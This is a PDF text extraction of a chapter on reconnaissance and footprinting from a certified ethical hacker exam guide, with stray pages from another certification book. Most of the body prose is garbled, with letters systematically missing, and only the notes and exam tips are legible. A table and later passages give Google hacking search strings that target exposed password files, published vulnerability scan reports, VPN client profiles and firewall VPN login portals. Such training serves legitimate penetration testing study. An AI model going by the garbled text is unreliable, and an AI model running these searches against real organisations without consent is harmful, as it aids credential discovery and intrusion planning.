site before download) and/or to store password values. Hashes are created by a
one-way algorithm.

14. B. The business impact analysis best matches this description. Although maximum
tolerable downtime is part of the process, and a continuity plan certainly addresses
it, a BIA is the actual process to identify those critical systems.

01-ch01.indd 49 14/09/21 3:52 PM



Passport_2019 / Mike Meyers’ CompTIA Security+™ Certifcation Passport / Dunkerley / 795-3 / FM / Blind olio: vi

This page intentionally left blank

00-FM.indd 6 09/11/20 6:45 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

CHAPTER

Reconnaissance: 2
Information Gathering
for the Ethical Hacker
In this chapter you will

• Deine active and passive ootprinting
• Identiy methods and procedures in inormation gathering
• Understand the use o social networking, search engines, and Google hacking

in inormation gathering
• Understand the use o whois, ARIN, and nslookup in inormation gathering
• Describe the DNS record types

I was wachig a au show o TV a coupl ighs back ad saw a lio pid hu fom
sa o fiish. Th acual d was oally awsom, if a bi gusom, wih a lo of ck
biig ad suffocaio, followd by bloody chwig. Bu h buildup o ha aack was
diff alogh. I a way, i was visually…boig. Bu if you wachd closly, you
could s h real wok of h aack was do bfo ay gy was usd a all.

Fo h fis h quas of h pogam, h camas focusd o lios jus siig
h, smigly oblivious o h wold aoud hm. A hd of alop was gazig
aby ad saw h lios, bu also w abou hi my busiss of pullig up ad
chwig o gass. Evy so of h lios would look up a h hd, almos lik hy
w couig shp (o alop) i a ffo o ap; h hy’d go back o lickig
hmslvs ad shooig away flis. A coupl ims hy’d g up ad soll aimlssly
abou, ad h hd would ac o way o aoh. La i h show, o cama agl
acoss h fild go a ga sho of a lio uig fom is apahic appaac o focusig
boh ys owad h hd—ad you could s wha was comig. Wh h pid fially
w o h aack, i was quick, coodiad, ad dadly.

Wha w hs lios doig? I ffc (ad, ys, I kow i’s a sch h, bu jus go
wih i) hy w foopiig. Thy sp h im figuig ou how h hd was mov-
ig, wh h old ad youg w, ad h bs way o spli hm off fo asy pickigs.
Aalogously, if w wa o b succssful i h viual wold w fid ouslvs i, h
w’d b la how o gah ifomaio abou ags before we even try to attack them.

51

02-ch02.indd 51 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

CEH Certified Ethical Hacker All-in-One Exam Guide

52

This chap is all abou h ools ad chiqus o do ha. Ad fo hos of you who
lish h hough of spy-vsus-spy ad spioag, you ca sill la a whol lo hough
good-old lgwok ad obsvaio, alhough mos of his is do hough viual mas.

Footprinting
Gahig ifomaio abou you idd ag is mo ha jus a bgiig sp
i h ovall aack; i’s a ssial skill you’ll d o pfc as a hical hack. I
bliv wha mos aspiig hical hacks wod abou cocig his paicula aa
of ou ca fild coms dow o wo qusios:

• Wha kid of ifomaio am I lookig fo?

• How do I go abou gig i?

Boh a xcll qusios (if I do say so myslf ), ad boh will b aswd i
his scio. As always, w’ll cov a fw basics i h way of h dfiiios, ms, ad
kowldg you’ll d bfo w g io h had suff.

You w alady ioducd o h m reconnaissance i Chap 1, so I wo’ bo
you wih h dfiiio agai h. I do hik i’s impoa, hough, ha you ud-
sad h may b a diffc i dfiiio bw coaissac ad footprinting,
dpdig o which scuiy pofssioal you’ alkig o. Fo may pos, co is mo
of a ovall, ovachig m fo gahig ifomaio o ags, whas foopi-
ig is mo of a ffo o map ou, a a high lvl, wha h ladscap looks lik. Thy
a ichagabl ms i CEH palac, bu if you jus mmb ha foopiig
is pa of coaissac, you’ll b fi.

Duig h foopiig sag, you’ lookig fo ay ifomaio ha migh giv you
som isigh io h ag—o ma how big o small. Ad h ifomaio dos’
cssaily d o b chical i au. Su, higs such as h high-lvl wok
achicu (wha ous a hy usig, ad wha svs hav hy puchasd?), h
applicaios ad wbsis (a hy public-facig?), ad h physical scuiy masus
(wha yp of y cool sysms ps h fis bai, ad wha ouis do h
mploys sm o b doig daily?) i plac a ga o kow, bu you’ll pobably b
aswig oh qusios fis duig his phas. Qusios cocig h ciical busi-
ss fucios, h ky illcual popy, ad h mos ssiiv ifomaio his
ogaizaio holds may vy wll b h mos impoa hills o climb i od o co
you ogaizaio appopialy ad diligly.

Of cous, ayhig povidig ifomaio o h mploys hmslvs is always
ga o hav bcaus h mploys ps a gigaic ag fo you la i h s.
Alhough som of his daa may b a lil icky o obai, mos of i is laivly asy o
g ad is igh h i fo of you, if you jus op you viual ys.

As fa as foopiig miology gos ad gig you f w wih EC-Coucil’s
viw of i, mos of i is faily asy o mmb. Fo xampl, whil mos foopi-
ig is passiv i au, aks advaag of fly availabl ifomaio, ad is dsigd
o b blid o you ag, somims a ovly scuiy-coscious ag ogaizaio
may cach o o you ffos. If you pf o say i h viual shadows (ad bcaus
you’ adig his book, I ca safly assum ha you do), you foopiig ffos may b

02-ch02.indd 52 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

53

dsigd i such a way as o obscu hi souc. If you’ ally saky, you may v ak
h x sp ad ca ways o hav you ffos ac back o ayo ad aywh
bu you.

NOTE Giving the appearance that someone else has done something illegal
is, in itself, a crime. Even i it’s not criminal activity that you’re blaming on
someone else, the threat o prison and/or a civil liability lawsuit should be
reason enough to think twice about this.

Anonymous footprinting, wh you y o obscu h souc of all his ifomaio
gahig, may b a ga way o wok i h shadows, bu pseudonymous footprinting is
jus dowigh aughy, makig somo ls ak h blam fo you acios. Fo ha
ma, you do’ v hav o poi h blam a a al pso—Kys Soz o Joh
Wick, fo xampl.

EXAM TIP ECC describes our main ocuses and beneits o ootprinting or
the ethical hacker:

1. Know the security posture (ootprinting helps make this clear).
2. Reduce the ocus area (network range, number o targets, and so on).
3. Identiy vulnerabilities (sel-explanatory).
4. Draw a network map.

Foopiig, lik vyhig ls i hackig, usually follows a faily ogaizd pah o
complio. You sa wih ifomaio you ca gah fom h “50,000-foo viw”—
usig h ag’s wbsi ad wb soucs o collc oh ifomaio o h ag—
ad h mov o a mo daild viw. Th ags fo gahig his yp of ifomaio
a umous ad ca b asy o laivly difficul o cack op. You may us sach
gis ad public-facig wbsis fo gal, asy-o-obai ifomaio whil simul-
aously diggig hough h Domai Nam Sysm (DNS) fo daild wok-lvl
kowldg. All of i is pa of foopiig, ad i’s all valuabl; jus lik a ivsigaio
i a cim ovl, o pic of vidc should b ovlookd, o ma how small o
smigly isigifica.

Tha said, i’s also impoa fo you o mmb wha’s ally impoa ad wha
h d goal is. Mila Kuda famously wo i The Unbearable Lightness of Being,
“Sig is limid by wo bods: sog ligh, which blids, ad oal dakss,” ad i
ally applis h. I h al wold, h oly hig mo fusaig o a p s ha
o daa is oo much daa. Wh you’ o a p s am ad you hav goals dfid
i advac, you’ll kow wha ifomaio you wa, ad you’ll gag you aciviis o
go g i. I oh wods, you wo’ (o should’) b gahig daa jus fo h sak of
collcig i; you should b focusig you ffos o h good suff.

Th a wo mai mhods fo gaiig h ifomaio you’ lookig fo. Bcaus
you’ll dfiily b askd abou hm o h xam, I’m goig o dfi aciv foopi-
ig vsus passiv foopiig h ad h spd fuh im bakig hm dow
houghou h s of his chap. A active footprinting ffo is o ha quis h
aack o ouch h dvic, wok, o souc, whas passive footprinting fs o

02-ch02.indd 53 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

CEH Certified Ethical Hacker All-in-One Exam Guide

54

masus o collc ifomaio fom publicly accssibl soucs. Fo xampl, passiv
foopiig migh b pusig wbsis o lookig up public cods, whas uig
a sca agais a IP addss you fid i h wok would b aciv foopiig. Wh
i coms o h foopiig sag of hackig, h vas majoiy of you aciviy will b
passiv i au. As fa as h xam is cocd, you’ cosidd passivly foopi-
ig wh you’ oli, chckig o wbsis, ad lookig up DNS cods, ad you’
acivly foopiig wh you’ gahig social giig ifomaio by commu-
icaig wih mploys.

NOTE Here’s a CEH testing conundrum oered by our astute technical
editor: What about websites designed to scan your target? There are plenty
o sites out there that will scan a target or you, and while it’s actively
scanning your target, it’s not YOU actively scanning it.

Lasly, I d o add a fial o h o foopiig ad you xam, bcaus i ds
o b said. Foopiig is of vial impoac o you job, bu fo whav aso ECC
jus dos’ focus a lo of aio o i i h xam. I’s acually somwha discoc-
ig ha his is such a big pa of h job y jus dos’ g much of is du o h xam.
Su, you’ll s suff abou foopiig o h xam, ad you’ll dfiily d o kow
i (I am, af all, wiig a all-iclusiv book h), bu i jus dos’ sm o b a big
pa of h xam. I’m o ally su why. Th good ws is, mos of his suff is asy o
mmb ayway, so l’s g o wih i.

Passive Footprinting
Bfo saig his scio, I go o wodig abou why passiv foopiig sms
so cofusig o mos folks. Duig pacic xams ad whao i a class I cly sa
hough, h w a fw qusios missd by mos folks cocig passiv foopi-
ig. I may hav o do wih h m passive (a quick “dfi passiv” wb sach shows
h m dos iaciviy, opaicipaio, ad a dowigh fusal o ac i h fac
of aggssio). O i may hav o do wih som folks jus ovhikig h qusio. I
hik i pobably has mo o do wih popl daggig commo ss ad al-wold
xpic io h xam oom wih hm, which is ally difficul o l go of. I ay
cas, l’s y o s h cod saigh by dfiig xacly wha passiv foopiig is
ad, idally, wha i is o.

NOTE Every once in a while, EC-Council puts something in the CEH study
materials that seems contrary to real lie. Many o us who have perormed
this sort o work know dang good and well what can and cannot get you
caught, and we bristle when someone tells us that, or instance, dumpster
diving is a passive activity. Thereore, do yoursel a avor and just stick with
the terms and deinitions or your exam. Aterward, you can join the rest o
us in mocking it. For now, memorize, trust, and go orth.

02-ch02.indd 54 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

55

Passiv foopiig as dfid by EC-Coucil has ohig o do wih a lack of ffo
ad v lss o do wih h ma i which you go abou i (usig a compu -
wok o o). I fac, i may ways i aks a lo more ffo o b a ffciv passiv
foopi ha a aciv o. Passiv foopiig is all abou h publicly accssibl
ifomaio you’ gahig ad o so much abou how you’ goig abou gig
i. Som mhods iclud gahig of compiiv illigc, usig sach gis,
pusig social mdia sis, paicipaig i h v-popula dumps div, gaiig -
wok ags, ad aidig DNS fo ifomaio. As you ca s, som of hs mh-
ods ca dfiily ig blls fo ayo payig aio ad do’ sm vy passiv o
commo-ss-midd popl aywh, much lss i ou pofssio. Bu you’ goig
o hav o g ov ha flig isig up i you abou passiv vsus aciv foopiig
ad jus accp his fo wha i is—o b ppad o miss a fw qusios o h xam.

Passiv ifomaio gahig dfiily coais h pusui ad acquisiio of com-
piiv illigc, ad bcaus i’s a dic objciv wihi CEH ad you’ll dfiily
s i o h xam, w’ goig o spd a lil im dfiig i h. Competitive intel-
ligence fs o h ifomaio gahd by a busiss iy abou is compios’ cus-
oms, poducs, ad makig. Mos of his ifomaio is adily availabl ad ca b
acquid hough diff mas. No oly is i lgal fo compais o pull ad aalyz
his ifomaio, i’s xpcd bhavio. You’ simply o doig you job i h busiss
wold if you’ o kpig up wih wha h compiio is doig. Simulaously, ha
sam ifomaio is valuabl o you as a hical hack, ad h a mo ha a fw
mhods o gai compiiv illigc.

Th compay’s ow wbsi is a ga plac o sa. Thik abou i: Wha do popl
wa o hi compay’s wbsi? Thy wa o povid as much ifomaio as possibl
o show poial cusoms wha hy hav ad wha hy ca off. Somims, hough,
his ifomaio bcoms ifomaio ovload. Jus som of h op souc ifoma-
io you ca gah fom almos ay compay o is si icluds compay hisoy,
dicoy lisigs, cu ad fuu plas, ad chical ifomaio. Dicoy lisigs
bcom usful i social giig, ad you’d pobably b supisd how much chi-
cal ifomaio busisss will kp o hi sis. Dsigd o pu cusoms a as,
somims sis iadvly giv hacks a lg up by povidig dails o h chical
capabiliis ad makup of hi wok.

Sval wbsis mak ga soucs fo compiiv illigc. Ifomaio o com-
pay oigis ad how i dvlopd ov h yas ca b foud i placs lik h Scuiy
ad Exchag Commissio’s (SEC) Elcoic Daa Gahig, Aalysis, ad Rival
(EDGAR) daabas (hps://www.sc.gov/dga.shml), D&B Hoovs (hps://www
.hoovs.com), LxisNxis (hps://www.lxisxis.com), ad Busiss Wi (hps://
www.busisswi.com). If you’ isd i compay plas ad fiacials, h follow-
ig lis povids som ga soucs:

• SEC Ifo (hps://www.scifo.com)

• Expia (hps://www.xpia.com)

• MakWach (hps://www.makwach.com)

• Th Wall S Tascip (hps://www.ws.com)

• Euomoio (hps://www.uomoio.com)

02-ch02.indd 55 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

CEH Certified Ethical Hacker All-in-One Exam Guide

56

NOTE Other aspects that may be o interest in competitive intelligence
include the company’s online reputation (as well as the company’s eorts
to control it) and the actual traic statistics o the company’s web traic
(https://www.alexa.com is a great resource or this). Also, check out https://
www.google.com/inance/, which will show you company news releases
on a timeline o its stock perormance—in eect, showing you when key
milestones occurred.

Active Footprinting
Wh i coms o aciv foopiig, p EC-Coucil, w’ ally alkig abou social
giig, huma iacio, ad ayhig ha quis h hack o iac wih
h ogaizaio. I sho, whas passiv masus ak advaag of publicly avail-
abl ifomaio ha wo’ (usually) ig ay alam blls, aciv foopiig ivolvs
xposig you ifomaio gahig o discovy. Fo xampl, you ca scub hough
DNS cods usually wihou ayo oicig a hig, bu if you w o walk up o a
mploy ad sa askig h qusios abou h ogaizaio’s ifasucu, some-
body is goig o oic. I hav a i chap ddicad o social giig comig
up (s Chap 12), bu will hi a fw highlighs h.

NOTE Social engineering is oten overlooked in a lot o pen testing cycles,
but honestly it’s an extremely eective ootprinting method. Books like
How to Win Friends and Influence People and The Art of Conversation are
antastic social engineering resources. You’d be surprised how much you
can learn about a target by simply being nice, charming, and a good
listener. And i you want a couple o books that hit very close to target, try
Social Engineering: The Science of Human Hacking and Unmasking the Social
Engineer: The Human Element of Security by Chris Hadnagy.

Social giig has a vaiy of dfiiios, bu i basically coms dow o co-
vicig popl o val ssiiv ifomaio, somims wihou v alizig hy’
doig i. Th a millios of mhods fo doig his, which ca somims g ally
cofusig. Fom h sadpoi of aciv foopiig, h social giig mh-
ods you should b cocd abou ivolv huma iacio. If you’ callig a
mploy o mig a mploy fac o fac fo a covsaio, you’ pacicig
aciv foopiig.

This may sm asy o udsad, bu i ca g complicad i a huy. Fo xampl,
I jus fiishd llig you social mdia is a ga way o ucov ifomaio passivly,
bu suly you’ awa you ca us som of hs social sis i a aciv ma. Wha
if you oply us Facbook cocios o quy fo ifomaio? O wha if you w
a qusio o somo? Boh of hos xampls could b cosidd aciv i au, so
b fowad.

02-ch02.indd 56 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

57

EXAM TIP This is a huge point o conusion on the exam, so let’s clear it
up here: in general, social engineering is an active ootprinting method
(unless, o course, you’re talking about dumpster diving, which is deined as
passive). What EC-Council is really trying to say is, social engineering eorts
that involve interviewing (phone calls, ace-to-ace interactions, and social
media) are active, whereas those not involving interviewing aren’t. In short,
just memorize “dumpster diving = passive,” and you’ll be okay.

Footprinting Methods and Tools
I vsio 11 of h xam, ECC coius puig a lo of focus o h ools hmslvs
ad o so much o h dfiiios ad ms associad wih hm. This is ally good
ws fom o sadpoi—hos dfiiios ad ms ca g idiculous, ad mmo-
izig h diffc bw o m ad aoh dos’ ally do’ do much i h
way of dmosaig you abiliy as a acual hical hack. Th bad ws is, you hav
o kow coulss ools ad mhods jus i cas you s a spcific qusio o h xam.
Ad, ys, h a ply of ools ad chiqus i foopiig fo you o la—boh
fo you xam ad you fuu i p sig.

Search Engines
Ev had of a lovbug? No, I’m o alkig abou som paid-up VW fom h 1960s;
I’m alkig abou h black bugs ha sick ogh ad fly aoud vywh i h
Souh a las wic a ya. Thy’ a plagu o all ha is good ad obl o h pla,
ad las ya, hy w ou i dovs.

Duig h aual plagu, sombody askd m if lovbugs sv a pupos—ay pu-
pos a all. If his had b back i my youh, I would’v had o shug ad admi I had
o ida. If I ally wad o kow, my oly cous would b o go o h libay ad
y o fid i i a book (GASP! Th HORROR!). O ha day, I simply pulld ou my
smapho ad did wha vyo ls dos—I googld i. Ask m viually ayhig
abou bugs ad, giv fiv mius ad a bows, I soud lik a omologis, wih a
mio i Lifsyls of h Lovbug.

NOTE You can google “lovebug liestyles” yoursel and discover the same
useless acts I did. While you’re at it, though, try the other search engines—
Bing, Yahoo!, DuckDuckGo, Baidu. Even AOL and Ask are still out there. It’s
good practice or using these search engines to ind inormation on your
target later in testing. Whether or not lovebugs serve a purpose at all, I’ll
leave to you, dear reader.

Fidig ifomaio pi o p sig ad hackig is o diff. Wa o
la how o us a ool? Go o YouTub ad sombody has a vido o i—jus y o
avoid h, shall w say, iaccua ffos ou h. Wa o dfi h diffc bw
BIA ad MTD? Go o you favoi sach gi ad yp hm i. Nd a good sudy
guid fo CEH? Typ i i ad—voilà—h you a.

02-ch02.indd 57 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

CEH Certified Ethical Hacker All-in-One Exam Guide

58

Sach gis ca povid a asu ov of ifomaio fo foopiig ad, if
usd poply, wo’ al ayo you’ sachig fo ifomaio abou hm. Mappig
ad locaio-spcific ifomaio, icludig div-by picus of h compay xio
ad ovhad shos, a so commoplac ow popl do’ hik of hm as foopiig
oppouiis. Howv, Googl Eah, Googl Maps, ad Big Maps ca povid loca-
io ifomaio ad, dpdig o wh h picus w ak, ca show poially
isig illigc. Ev psoal ifomaio—lik sidial addsss ad pho
umbs of mploys—a ofims asy ough o fid usig h wbsis fo com-
pais such as LikdI (www.likdi.com) ad Pipl (www.pipl.com).

A ally cool ool alog hs sam lis is Ncaf (hps://www.caf.com). Fi i
up ad ak a look a vyhig you ca fid. Rsicd URLs, o idd fo public
disclosu, migh jus show up ad povid som juicy idbis. If h si ow is ally
sloppy (o somims v if hy’ o), Ncaf oupu ca show you h opaig
sysm (OS) o h box oo.

NOTE Netcrat has a pretty cool toolbar add-on or Fireox and Chrome
(https://www.netcrat.com/apps/browser/).

Aoh absolu goldmi of ifomaio o a poial ag is job boads. Go o
wbsis fo CaBuild, Mos, Dic, o ay of h muliud of ohs, ad you ca
fid almos vyhig you’d wa o kow abou h compay’s chical ifasucu.
Fo xampl, a job lisig ha sas “Cadida mus b wll vsd i Widows Sv
2012 R2, Micosof SQL Sv 2016, ad Vias Backup svics” is’ psaiv
of a wok ifasucu mad up of Liux svs. Th chical job lisigs fla-ou
ll you wha’s o h compay’s wok—ad of wha vsios. Combi ha wih
you asu kowldg of vulabiliis ad aack vcos, ad you’ wll o you way
o a succssful p s!

Footprinting Gone Wild
Suppos, fo a mom, you’ acually o a p s am ad you’v all do
higs h igh way. You hammd ou a agm bfohad, s you scop,
agd o wha should b xploid (o o), ad go all you lgal suff ak ca
of ad sigd off by h igh popl. You follow you am lad’s dicio ad
accomplish h asks s bfo you—his im jus som basic (da I say, passive)
coaissac. Af a fw sps ad poks h ad h, you u a wb cawl
(lik BlackWidow, GSA Email Spid, NCollco Sudio, o v GNU Wg),
hopig o g som coac ifomaio ad mploy daa. A h d of h day
h am gs ogh o viw fidigs ad poial poblms. You am lad
s h oom agy ad fusad. I sms ha som wb applicaio daa was
dld i spos o a ifomaio gab. Th am us ad looks a you: “Wha
did I do?!”

02-ch02.indd 58 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

59

Mos p s agms hav som kid of claus buil i o poc h am
fom jus such a occuc. Ca a wb spid acually caus h dlio of ifo-
maio fom vy, vy pooly pogammd wb applicaios? Of cous i ca, ad
you—h haplss am mmb—would hav no idea abou said ibl applicaio
uil you a a s (i his cas, a cawl) agais i.

Could you b hld accouabl? Should you b hld accouabl? Th asw
is, mayb. If you do’ su ha you p s agm is i od ad icluds
laguag lik

Due to the execution of toolsets, exploits, and techniques, the possibility exists for
the unintentional deletion or modification of sensitive data in the test environ-
ment, which may include production-level systems...

followd by a sam absolvig you am fom uiioal poblms, h,
ys—cogaulaios—you’ accouabl.

Wa aoh o you should hik abou? Ty woyig abou wha acios
you ag aks wh hy s you. If a wok admi shus vyhig dow
bcaus h hiks hy’ ud aack ad ha causs fill in the blank, a you a
faul? You may b if you do’ hav a claus ha ads somhig lik h followig:

The actions taken by the target in response to any detection of our activities are
also beyond our control…

Wha happs if a cli dcids hy do’ wa o accp ha claus i h
agm? Wll, sic h’s absoluly o way o guaa v h calms of
p s ools ad chiqus wo’ al o v dsoy daa o sysms, my advic
would b o u. Jus bcaus oolss ad chiqus a dsigad passiv i
au, ad jus bcaus hy a’ dsigd o xploi o caus ham, do’ bliv
you ca jus fi away ad o woy abou i. Tools do’ giv a ip abou you
i. G you agm i od fis, h l you ools ou o Spig Bak.

NOTE The Computer Fraud and Abuse Act (1986) makes conspiracy to
commit hacking a crime. Thereore, it’s important that the ethical hacker get
an ironclad agreement in place before even attempting basic ootprinting.

Whil w’ o h subjc of usig wbsis o ucov ifomaio, do’ glc h
iumabl opios availabl o you—all of which a f ad pfcly lgal. Social
wokig sis ca povid all sos of ifomaio. Sis such as LikdI, wh po-
fssioals build laioships wih ps, ca b a ga plac o pofil fo aacks la.
Facbook ad Twi a also ga soucs of ifomaio, spcially wh h ag
compay has had layoffs o oh psol poblms cly—disguld fom

02-ch02.indd 59 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

CEH Certified Ethical Hacker All-in-One Exam Guide

60

mploys a always good fo som lva compay di. Ad, jus fo som al fu,
chck ou hp://.wikipdia.og/wiki/Robi_Sag o s jus how powful social -
wokig ca b fo dmid hacks.

EXAM TIP You can also use alerting to help monitor your target. Google,
Yahoo!, and Twitter all oer services that provide up-to-date inormation
that can be texted or e-mailed to you when there is a change.

Google
A usful acic i foopiig a ag was populaizd maily i la 2004 by a guy
amd Johy Log, who was pa of a IT scuiy am a his job. Whil pfom-
ig p ss ad hical hackig, h sad payig aio o how h sach sigs
wokd i Googl. Th sach gi has always had addiioal opaos dsigd o
allow you o fi-u you sach sig. Wha M. Log did was simply apply ha logic
fo a mo faious pupos.

Suppos, fo xampl, isad of jus lookig fo a wb pag o boa pai o sach-
ig fo a imag of a caoo ca, you dcidd o ll h sach gi, “Hy, do you
hik you ca look fo ay sysms ha a usig Rmo Dskop Wb Cocio?”
O how abou, “Ca you plas show m ay MySQL hisoy pags so I ca y o lif a
passwod o wo?” Amazigly ough, sach gis ca do jus ha fo you, ad mo.
Th m his pacic has bcom kow by is Google hacking.

Googl hackig ivolvs maipulaig a sach sig wih addiioal spcific opa-
os o sach fo vulabiliis. Tabl 2-1 dscibs advacd opaos fo Googl hack
sach sigs.

Iumabl wbsis a availabl o hlp you wih Googl hack sigs (o o m-
io Googl offs sval suppo pags fo ach opao i us). Fo xampl, fom
h Googl Hackig Daabas (a si ha usd o b opad by M. Johy Log ad
Hacks fo Chaiy ad is ow owd ad opad by Offsiv Scuiy, hps://
www.xploi-db.com/googl-hackig-daabas), y his sig fom whv you a
igh ow:

allinurl:tsweb/default.htm

NOTE That iletype: operator in Table 2-1 oers loads o cool stu. I you
want a good list o ile types to try, check out https://support.google.com/
webmasters/answer/35287?hl=en (a link showing many ile types). And
don’t orget, source code and all sorts o craziness are indexable, and thus
oten accessible, so don’t discount anything!

Basically you’ llig Googl o go look fo wb pags ha hav TSWEB i h
URL (idicaig a mo accss cocio pag) ad you wa o s oly hos ha
a uig h dfaul HTML pag (dfaul isalls a commo i a hos of diff

02-ch02.indd 60 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

61

Operator  Syntax  Description

iletype iletype:type Searches only or iles o a speciic type (DOC, XLS, and so
on). For example, the ollowing will return all Microsot
Word documents:

filetype:doc

index o index o /string Displays pages with directory browsing enabled,
usually used with another operator. For example, the
ollowing will display pages that show directory listings
containing passwd:

"intitle:index of" passwd

ino ino:string Displays inormation Google stores about the page itsel:

info:www.anycomp.com

intitle intitle:string Searches or pages that contain the string in the title. For
example, the ollowing will return pages with the word
login in the title:

intitle: login

For multiple string searches, you can use the allintitle
operator. Here’s an example:

allintitle:login password

inurl inurl:string Displays pages with the string in the URL. For example,
the ollowing will display all pages with the word passwd
in the URL:

inurl:passwd

For multiple string searches, use allinurl. Here’s an example:

allinurl:etc passwd

link link:string Displays linked pages based on a search term.

related related:webpagename Shows web pages similar to webpagename.

site site:domain or web Displays pages or a speciic website or domain holding
page string the search term. For example, the ollowing will display

all pages with the text passwds in the site anywhere.com:

site:anywhere.com passwds

Table 2-1 Google Search String Operators

aas ad usually mak higs a lo asi fo a aack). I hik you may b supisd
by h suls—I v saw o pag wh a admi had did h x o iclud h
logo ifomaio.

NOTE Google hacking is such a broad topic that covering all o it in one
section o a single book is impossible. This link, among others, provides a
great list to work through: http://it.toolbox.com/blogs/managing-inosec/
google-hacking-master-list-28302. Take advantage o any o the websites
available and learn more as you go along. What you’ll need exam-wise is to
know the operators and how to use them.

02-ch02.indd 61 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

CEH Certified Ethical Hacker All-in-One Exam Guide

62

As you ca s, Googl hackig ca b usd fo a wid ag of puposs. Fo xampl,
you ca fid f music dowloads (piaig music is a o-o, by h way, so do’ do i)
usig h followig:

"intitle:index of" nameofsong.mp3

You ca also discov op vulabiliis o a wok. Fo xampl, h followig
povids ay pag holdig h suls of a vulabiliy sca usig Nssus (isig o
ad, would’ you say?):

"intitle:Nessus Scan Report" "This file was generated by Nessus"

Combi hs wih h advacd opaos, ad you ca really dig dow io som
isig suff. Agai, o of hs sach sigs o “hacks” is illgal—you ca sach
fo ayhig you wa (assumig, of cous, you’ o sachig fo illgal co, bu
do’ ak you lgal advic fom a cificaio sudy book). Howv, acually xploiig
ayhig you fid wihou pio cos will dfiily lad you i ho wa.

Whil h pvious gal Googl hackig xampls will sv wll fo you xam,
h a os ad os mo of hm (s h afomiod GHDB fo ally off-h-
wall os wh you’ bod) you’ll d o pacic wih. Som of h mo isig
oulis o you as a buddig hical hack hav o do wih VoIP ad VPN. Why? Wll,
VoIP sysms povid a py isig oppouiy, oc you kow wh hy’ a
ad wha hy’ doig. Fo xampl, did you kow a buch of VoIP sysms us upo-
cd Tivial FTP (TFTP) o pull cofig fils, som v hav a pack capu opio
buil io h pho, ad mos VoIP dvics also u wb svs fo mo maag-
m? Tha’s go o a las piqu you is. Ad VPN? If you ca fid ad sal a fw
cypio kys, a VPN cocio is as good as bakig io h offic ad pluggig
you lapop i o Bob’s dsk.

Googl hacks fo VoIP ad VPN wok jus lik hos fo vyhig ls; you’ look-
ig fo pags wih spcific ifomaio ha will hlp you, ad h combiaio of sach
m ad opao will aow h fild fo you. Fo xampl, usig “logi,” “logi pag,”
ad “wlcom” wih h iil: opao could show logi poals. Wa o g spcific?
Ty “D-Lik VIP Rou” fo D-Lik ou poals ad “SPA504G” fo Cisco cofigu-
aio uiliis. You migh y filetype:pcf vpn OR Group o fid VPN cli pofil cofig-
uaio fils (PFCs) ha a publicly availabl. O how abou inurl:/remote/login?lng=en
fo FoiGa fiwall SSL VPN poals? Th poi is, h a dlss uss fo Googl
hackig gadig VoIP ad VPN.

Aoh o o Googl hackig: i’s o as asy o pull off as i oc was. Googl, fo
asos I will avoid discussig h bcaus i ags m o o d, has dcidd i ds
o polic sach suls o pv folks fom usig h sach gi as i was idd
o b usd. As you ca s fom Figu 2-1, ad pobably fom you ow Googl hack-
ig amps i laig his oppouiy, Googl will, fom im o im, how up a
CAPTCHA if i blivs you’ a “bo” o yig o us h sach gi fo faious
puposs. Th a ways aoud h aoyac ha a wll documd ad accssibl
via Googl sachs, bu i sill dos’ ak away h aoyac faco. Wih ha i
mid, whil Googl hackig is, wll, pa of Googl, do’ discou usig oh sach
gis i lookig fo you holy gail.

02-ch02.indd 62 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

63

Figure 2-1 Google CAPTCHA

Geek Humor
I admi i, a lo of us i h chical alm of lif do’ always sm o hav h
gas of social skills. I fac, fidig a ch pso who ca acually commuica
wih oh huma bigs i a pofssioal o psoal sig is lik fidig a fou-
laf clov. Bu o o ca v say gks do’ hav a dc ss of humo. Uil
cly, hough, gk humo was mo of a “isid basball” hig—somhig
we kw abou ad shad amog ouslvs, gazig dow ou oss a h mig
masss of uss who had o ida wha w w alkig abou. Bu pop culu ad
Hollywood fially caugh up wih us.

I 2011, a guy amd Es Cli wo a faasic book calld Ready Player
One. I’s a fas-pacd al filld wih gloious ’80s fcs, wodful chaacs,
ad a oigial soy, ad is asily o of my favoi scap ficio ovls of all
im. I i, a cao of a wildly popula viual aliy wold hid a piz isid his
digial caio ad, af his dah, mad a hug gam ou of h sach fo his
“Eas gg.”

I usd o b ha mioig h m “Eas gg” mad folks hik abou
small ubs of viga-wa food coloig ad kids uig aoud filds gahig
colod had-boild o plasic ggs. Bu af h book’s las (ad h subsqu
blasphmous, subsadad, hodous mocky ha is h 2018 movi vsio of
h book), mos folks kw ha a Easter egg is somhig dvlops pu i a
applicaio, wbsi, o gam jus fo giggls. Ousid of “gus” huig h gg
dow i a gia viual wold (usig hi wis ad illigc i h book, o sh
